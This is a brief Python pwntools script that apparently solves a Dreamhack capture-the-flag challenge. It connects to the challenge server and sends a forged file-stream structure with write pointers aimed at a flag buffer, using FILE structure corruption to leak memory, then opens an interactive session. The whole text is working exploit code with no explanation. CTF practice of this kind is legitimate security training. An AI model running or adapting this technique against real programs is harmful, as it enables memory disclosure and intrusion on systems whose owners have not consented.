from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 10539
r = remote(HOST, PORT)

flag_buf=0x6010a0
payload = flat([
    0xfbad1800,
    0, 0, 0,
    flag_buf,
    flag_buf+1024,
    0, 0, 0, 0, 0, 0, 0, 0,
    1
])
r.sendlineafter(b'Data: ', payload)
r.interactive()